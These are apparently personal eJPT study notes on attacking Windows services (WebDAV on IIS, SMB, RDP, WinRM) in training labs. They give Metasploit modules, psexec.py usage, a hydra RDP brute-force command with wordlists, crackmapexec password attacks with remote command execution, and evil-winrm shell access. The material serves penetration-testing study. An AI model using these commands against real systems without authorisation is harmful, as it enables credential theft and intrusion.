#eJPT #INE #Windows 

*Microsoft Windows is the dominant operating system worldwide with a market share >=70% as of 2021.*


| COMMAND    | FUNCTION                             |
| ---------- | ------------------------------------ |
| *xfreerdp* | connect remotely to a windows system |


# Common Windows Vulnerabilities

● **Information disclosure** - Vulnerability that allows an attacker to access confidential data.
● **Buffer overflows** - Caused by a programming error, allows attackers to write data to a buffer and overrun the allocated buffer, consequently writing data to allocated memory addresses.
● **Remote code execution** - Vulnerability that allows an attacker to remotely execute code on the target system.
● **Privilege escalation** - Vulnerability that allows an attacker to elevate their privileges after initial compromise.
● **Denial of Service (DOS)** - Vulnerability that allows an attacker to consume a system/host’s resources (CPU, RAM, Network etc) consequently preventing the system from functioning normally.

---
# Frequently Exploited Services

![[Frequently Exploited Windows Services.png]]

---
# Microsoft IIS

*IIS can be used to host both static and dynamic web pages developed in ASP.NET and PHP.*

- Typically configured to run on **ports 80/443**.
- Supported executable file extensions:
	+ .asp
	+ .aspx
	+ .config
	+ .php

---
# WebDAV

*WebDAV essentially enables a web server to function as a file server for collaborative authoring.*
- WebDAV runs on top Microsoft IIS on **ports 80/443.**
- In order to connect to a WebDAV server, you will need to <u>provide legitimate credentials</u>. This is because WebDAV implements authentication in the form of a username and password

#### Tools

- **davtest** - Used to scan, authenticate and exploit a WebDAV server.
- **cadaver** - cadaver supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking on WebDAV servers.

[[Vulnerability Assessment & Analysis & Scanning]]

#### Exploiting with Metasploit

1. Nmap the services
2. davtest the /webdav/ path
3. Metasploit `use exploit/windows/iis/iis_webdav_upload_asp`
4. Set the options 
5. get meterpreter 
6. Spawn shell session so we get usual commands
```bash
meterpreter> shell   # Spawn normal shell
meterpreter> /bin/bash -i # Convert to interactive bash session
```

---
# SMB

*SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139.*

The SMB protocol utilizes **two levels of authentication**, namely:
- **User authentication** - Users must provide a username and password in order to authenticate with the SMB server in order to access a share.
- **Share authentication** - Users must provide a password in order to access restricted share.
![[SMB Authentication.png]]

#### Exploiting with psexec.py

1. Check out [[Enumeration]] for more info on discovering user accounts.
2.  `psexec.py USER@IP SHELL_TYPE` 
==EX== : psexec.py Administrator@10.101.12.11 cmd.exe

OR

#### Exploiting with Metasploit
1. Check out [[Enumeration]] for more info on discovering user accounts.
2. use `msf6 exploit(windows/smb/psexec)`

---

# RDP

*The Remote Desktop Protocol (RDP) is a proprietary GUI remote access protocol developed by Microsoft and is used to remotely connect and interact with a Windows system.*
- RDP uses TCP port 3389 by default, and can also be configured to run on any other TCP port.
- We can perform an RDP brute-force attack to identify legitimate user credentials that we can use to gain remote access to the target system.

Connect via **xfreerdp** : `xfreerdp /u:[username] /p:[password] /v:[ip_address]:[port]`
#### Exploiting using metasploit

1. Scan the host with nmap
2. `use auxiliary/scanner/rdp/rdp_scanner` to confirm RDP port and version
3. start brute force : `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3333`
4. connect to host using **xfreerdp**

---
# WinRM

Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems over HTTP(S).

- WinRM typically uses TCP **port 5985 and 5986 (HTTPS)**.

Used to :
*○ Remotely access and interact with Windows hosts on a local network.*
*○ Remotely access and execute commands on Windows systems.*
*○ Manage and configure Windows systems remotely.*

#### Exploit using crackmapexec

```bash
crackmapexec winrm IP -u administrator -p WORDLIST
```
Once you have the passsword ->
```bash
crackmapexec winrm IP -u administrator -p PASS -x CMD
```

#### Exploit using evil-winrm
Get a shell using ->
```bash
evil-winrm.rb -u USER -p 'PASS' -i IP
```

#### Exploit using Metasploit

```bash
msf>use exploit/windows/winrm/winrm_script_exec
```